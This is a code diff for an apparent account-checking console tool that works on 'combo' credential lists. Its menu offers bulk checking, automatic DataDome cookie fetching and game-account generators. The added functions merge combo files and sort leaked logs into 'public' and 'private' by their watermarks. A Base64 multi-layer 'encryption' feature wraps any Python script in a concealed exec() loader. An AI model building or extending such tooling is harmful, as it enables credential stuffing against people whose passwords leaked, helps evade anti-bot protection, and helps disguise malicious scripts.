+    prompt_panel = Panel("[white]Press Enter to start merging[/white]", title="[bright_cyan]❯ Action[/bright_cyan]", border_style="bright_cyan", box=box.ROUNDED, expand=False)
+    rprint(Padding(prompt_panel, (0, 0, 0, 4)))
+    input("        ❯ ")
+
+    out_dir = Path("Results")
+    out_dir.mkdir(exist_ok=True)
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    merged_file_path = out_dir / f"merged_{timestamp}.txt"
+
+    _log('INFO', 'Merging files...')
+
+    try:
+        with open(merged_file_path, 'w', encoding='utf-8') as out_f:
+            for fd in file_details:
+                with open(fd["path"], 'r', encoding='utf-8', errors='ignore') as in_f:
+                    for line in in_f:
+                        out_f.write(line)
+                        if not line.endswith('\n'):
+                            out_f.write('\n')
+
+        final_size = merged_file_path.stat().st_size
+        final_size_str = f"{final_size} B"
+        for unit in ['B', 'KB', 'MB', 'GB']:
+            if final_size < 1024.0:
+                final_size_str = f"{final_size:.2f} {unit}"
+                break
+            final_size /= 1024.0
+
+        current_time = datetime.now().strftime("%I:%M %p")
+        current_date = datetime.now().strftime("%Y-%m-%d")
+
+        summary_table = Table(show_header=False, box=box.SIMPLE_HEAVY, border_style="cyan")
+        summary_table.add_column("Property", style="dim")
+        summary_table.add_column("Value", style="bold white")
+
+        summary_table.add_row("Files Merged", str(len(file_details)))
+        summary_table.add_row("Merged Size", final_size_str)
+        summary_table.add_row("Total Lines", str(total_lines_all))
+        summary_table.add_row("Date", current_date)
+        summary_table.add_row("Time", current_time)
+
+        summary_panel = Panel(
+            summary_table,
+            title="[bold green]MERGING COMPLETE[/bold green]",
+            subtitle="[dim cyan]Powered by: @dvlist[/dim cyan]",
+            border_style="green",
+            expand=False
+        )
+        print()
+        rprint(Padding(summary_panel, (0, 0, 0, 4)))
+        _log('SUCCESS', f'Saved to {merged_file_path}')
+
+    except Exception as e:
+        _log('ERROR', f'Failed during merge: {e}')
+
+    input(f'\n  {_DIM}[Press Enter to return to menu]{_RST} ')
+
+
+def high_security_encryption():
+    from rich.panel import Panel
+    from rich import print as rprint
+    from rich.padding import Padding
+    from rich import box
+    from rich.table import Table
+    import os
+    import base64
+    from datetime import datetime
+    from pathlib import Path
+
+    clear_screen()
+    display_banner()
+    print()
+
+    combo_dir = Path("Combo")
+    if not combo_dir.exists():
+        combo_dir.mkdir(exist_ok=True)
+
+    py_files = list(combo_dir.glob("*.py"))
+
+    if not py_files:
+        _log('ERROR', "No .py files found in 'Combo' folder. Please add your python files there.")
+        input(f'\n  {_DIM}↵ menu{_RST} ')
+        return
+
+    info_table = Table(box=box.HORIZONTALS, header_style="bold cyan", border_style="cyan", padding=(0, 2))
+    info_table.add_column("#", style="bright_cyan", justify="center")
+    info_table.add_column("Filename", style="bold white")
+    info_table.add_column("Size", style="white", justify="right")
+
+    for idx, fp in enumerate(py_files, 1):
+        size = fp.stat().st_size
+        size_str = f"{size} B"
+        for unit in ['B', 'KB', 'MB', 'GB']:
+            if size < 1024.0:
+                size_str = f"{size:.2f} {unit}"
+                break
+            size /= 1024.0
+        info_table.add_row(str(idx), fp.name, size_str)
+
+    panel = Panel(info_table, title="[bold white]PYTHON FILES IN COMBO[/bold white]", box=box.DOUBLE_EDGE, border_style="bright_cyan", expand=False)
+    rprint(Padding(panel, (0, 0, 0, 4)))
+
+    while True:
+        try:
+            prompt_panel = Panel("[white]Enter file number[/white]", title="[cyan]❯ Input[/cyan]", border_style="cyan", box=box.ROUNDED, expand=False)
+            rprint(Padding(prompt_panel, (0, 0, 0, 4)))
+            choice_idx = int(input("        ❯ ").strip())
+            if 1 <= choice_idx <= len(py_files):
+                selected_file = py_files[choice_idx - 1]
+                break
+            _log('ERROR', 'Invalid number — try again.', '    ')
+        except ValueError:
+            _log('ERROR', 'Enter a valid number.', '    ')
+
+    while True:
+        try:
+            prompt_panel = Panel("[white]How many layers of Base64 encryption?[/white]", title="[cyan]❯ Input[/cyan]", border_style="cyan", box=box.ROUNDED, expand=False)
+            rprint(Padding(prompt_panel, (0, 0, 0, 4)))
+            layers = int(input("        ❯ ").strip())
+            if layers > 0:
+                break
+            _log('ERROR', 'Must be greater than 0.', '    ')
+        except ValueError:
+            _log('ERROR', 'Enter a valid number.', '    ')
+
+    _log('INFO', f"Encrypting {selected_file.name} with {layers} layers...", '    ')
+
+    try:
+        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+
+        payload = content.encode('utf-8')
+        for _ in range(layers):
+            payload = base64.b64encode(payload)
+
+        encrypted_content = f"import base64\np = {payload}\nfor _ in range({layers}):\n    p = base64.b64decode(p)\nexec(p.decode('utf-8'))"
+
+        out_dir = Path("Results") / "obf"
+        out_dir.mkdir(parents=True, exist_ok=True)
+
+        out_name = selected_file.stem + "-obf.py"
+        out_path = out_dir / out_name
+
+        with open(out_path, 'w', encoding='utf-8') as f:
+            f.write(encrypted_content)
+
+        final_size = out_path.stat().st_size
+        final_size_str = f"{final_size} B"
+        for unit in ['B', 'KB', 'MB', 'GB']:
+            if final_size < 1024.0:
+                final_size_str = f"{final_size:.2f} {unit}"
+                break
+            final_size /= 1024.0
+
+        line_count = len(encrypted_content.splitlines())
+        current_time = datetime.now().strftime("%I:%M %p")
+        current_date = datetime.now().strftime("%Y-%m-%d")
+
+        summary_table = Table(show_header=False, box=box.SIMPLE_HEAVY, border_style="cyan")
+        summary_table.add_column("Property", style="dim")
+        summary_table.add_column("Value", style="bold white")
+
+        summary_table.add_row("File Saved", str(out_path))
+        summary_table.add_row("New File Size", final_size_str)
+        summary_table.add_row("Total Lines", str(line_count))
+        summary_table.add_row("Encryption Layer", f"Base64 ({layers} Layers)")
+        summary_table.add_row("Date", current_date)
+        summary_table.add_row("Time", current_time)
+
+        summary_panel = Panel(
+            summary_table,
+            title="[bold green]ENCRYPTION COMPLETE[/bold green]",
+            subtitle="[dim cyan]Powered by: @dvlist[/dim cyan]",
+            border_style="green",
+            expand=False
+        )
+        print()
+        rprint(Padding(summary_panel, (0, 0, 0, 4)))
+
+    except Exception as e:
+        _log('ERROR', f'Encryption failed: {e}')
+
+    input(f'\n  {_DIM}[Press Enter to return to menu]{_RST} ')
+
+
+def detect_watermark():
+    from rich.panel import Panel
+    from rich import print as rprint
+    from rich.padding import Padding
+    from rich import box
+    import os
+
+    clear_screen()
+    display_banner()
+    print()
+
+    file_manager = AccountFileManager()
+    file_viewer = AccountFileViewer()
+    combo_files = file_manager.scan_combo_folder()
+
+    if not combo_files:
+        _log('ERROR', "No combo files found in 'Combo' folder.")
+        input(f'\n  {_DIM}↵ menu{_RST} ')
+        return
+
+    file_infos = []
+    for file_path in combo_files:
+        info = file_manager.get_file_info(file_path)
+        if info:
+            file_infos.append(info)
+
+    if not file_infos:
+        _log('ERROR', 'No valid combo files found.')
+        input(f'\n  {_DIM}↵ menu{_RST} ')
+        return
+
+    file_viewer.display_file_table(file_infos)
+    selected_file = file_viewer.prompt_file_selection(file_infos)
+
+    _log('INFO', f"Scanning {os.path.basename(selected_file)} for watermarks...", '    ')
+
+    try:
+        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as f:
+            lines = f.readlines()
+
+        watermarks = []
+        for line in lines:
+            line = line.strip()
+            lower_line = line.lower()
+            if 'http' in lower_line or 't.me' in lower_line or '|' in line or '  ' in line or (line.count(':') != 1 and len(line) > 15):
+                if line not in watermarks:
+                    watermarks.append(line)
+                    if len(watermarks) >= 15:
+                        break
+
+        if watermarks:
+            result_text = "\n".join(watermarks)
+            panel_title = "[bold red]WATERMARKS DETECTED (PUBLIC LOGS)[/bold red]"
+            border_color = "red"
+        else:
+            result_text = "No watermarks detected. Logs appear to be PRIVATE."
+            panel_title = "[bold green]NO WATERMARKS DETECTED[/bold green]"
+            border_color = "green"
+
+        result_panel = Panel(
+            f"[bold white]{result_text}[/bold white]",
+            title=panel_title,
+            border_style=border_color,
+            box=box.DOUBLE_EDGE,
+            expand=False
+        )
+        print()
+        rprint(Padding(result_panel, (0, 0, 0, 4)))
+
+    except Exception as e:
+        _log('ERROR', f'Failed to scan file: {e}')
+
+    input(f'\n  {_DIM}[Press Enter to return to menu]{_RST} ')
+
+def main():
+    cookie_manager = CookieManager()
+    n_cookies = len(cookie_manager.live_cookies)
+    display_banner()
+    if n_cookies > 0:
+        _log('SUCCESS', f'Fresh cookies loaded: {n_cookies:,} — unli mode active')
+    else:
+        _log('WARNING', 'No fresh_cookie.txt — will auto-fetch DataDome cookies on demand')
+    print()
+    time.sleep(0.5)
+
+    while True:
+        clear_screen()
+        display_banner()
+        choice = display_main_menu()
+        if choice == '1':
+            bulk_check(bulk_mode='full')
+        elif choice == '2':
+            bulk_check(bulk_mode='semi')
+        elif choice == '3':
+            bulk_check(bulk_mode='none')
+        elif choice == '4':
+            single_check()
+        elif choice == '6':
+            file_splitter()
+        elif choice == '7':
+            file_merger()
+        elif choice == '8':
+            detect_watermark()
+        elif choice == '9':
+            high_security_encryption()
+        elif choice == '10':
+            generate_cn31()
+        elif choice == '11':
+            generate_codm()
+        elif choice == '12':
+            generate_mlbb()
+        elif choice == '5':
+            print(f'\n  {_YL}⚠  Tool under construction.{_RST}')
+            input(f'\n  {_DIM}↵ menu{_RST} ')
 
 if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print(f'\n  {yl}⚠  Script terminated by user.{rst}\n')
+        print(f'\n  {_YL}⚠  Script terminated by user.{_RST}\n')
     except Exception as e:
         import traceback
-        reason = str(e)
-        print(f'\n  {rd}✖  Unexpected error: {reason}{rst}')
+        error_msg = str(e)
+        print(f'\n  {_RD}✖  Unexpected error: {error_msg}{_RST}')
         traceback.print_exc()
         try:
             with open('error_log.txt', 'a', encoding='utf-8') as f:
-                f.write(
-                    f'[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}]: '
-                    f'{reason}\n'
-                )
+                f.write(f'[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}]: {error_msg}\n')
                 f.write(traceback.format_exc())
-                f.write('\n' + '-' * 60 + '\n')
+                f.write('\n' + '-'*60 + '\n')
         except Exception:
             pass
